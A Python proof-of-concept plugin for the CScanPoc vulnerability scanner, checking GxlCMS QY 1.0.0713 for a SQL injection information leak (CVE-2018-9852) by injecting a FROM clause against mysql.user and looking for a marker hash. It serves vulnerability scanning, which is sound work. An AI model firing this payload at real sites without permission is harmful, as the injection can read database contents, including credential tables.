# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'GxlCMS_0002'  # 平台漏洞编号，留空
    name = 'Gxlcms QY信息泄露漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-04-08'  # 漏洞公布时间
    desc = '''
        Gxlcms是一套企业网站创建系统。
        Gxlcms QY 1.0.0713版本中的Lib\Lib\Action\Home\HitsAction.class.php文件存在安全漏洞。远程攻击者可通过向Home-Hits请求中的查询字符串注入FROM从句利用该漏洞读取数据库中的数据。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-07442'  # 漏洞来源
    cnvd_id = 'CNVD-2018-07442'  # cnvd漏洞编号
    cve_id = 'CVE-2018-9852'  # cve编号
    product = 'GxlCMS'  # 漏洞应用名称
    product_version = '1.0.0713'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '983eda45-395b-43b1-9c9e-4f9393a1c5a8'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/gxlcms/index.php?s=Home-Hits-show&type=password&sid=md5(c)%20from%20mysql.user%23'
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
